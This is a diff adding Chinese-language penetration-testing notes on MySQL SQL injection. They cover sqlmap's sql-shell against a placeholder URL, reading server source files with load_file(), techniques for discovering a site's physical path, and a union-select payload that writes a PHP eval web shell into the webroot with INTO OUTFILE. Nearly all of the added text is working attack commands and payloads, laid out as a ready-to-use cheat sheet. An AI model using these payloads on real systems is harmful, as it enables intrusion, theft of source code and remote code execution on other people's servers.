@@ -29,3 +29,25 @@ Mysql数据库：
     $pass='password';
     $webml='/www/';
     ?>
+
+mysql4.0 
+  利用sqlmap的sql-shell读取源码文件：
+  python sqlmap.py -u "http://xxx.com/index.php?id=1" --sql-shell 
+  根据报错等方式可以获取到物理路径文件如：/home/webroot/introduction.php
+  读取该文件：sql-shell>select load_file('/home/webroot/introduction.php');
+  也可以使用绝对路径的十六进制来读取，但是不能使用单引号
+  
+  
+物理路径获取方式：
+  1.报错显示
+  2.google hacking： site:xxx.com warning
+  3.遗留文件 phpinfo , info , test , php
+  4.漏洞爆路径
+  5.读取配置文件
+  6.根据操作系统猜测默认路径 ，如win2003+IIS：c:/windows/system32/inetsrv/metabase.xml
+  
+读取函数：load_file()
+写入函数：into outfile：
+  and 1=2 union select 1,"<?php @eval($_POST['test']);?>",3,4,5 into outfile 'c:/wwwroot/xxx/test.php'
+  
+  
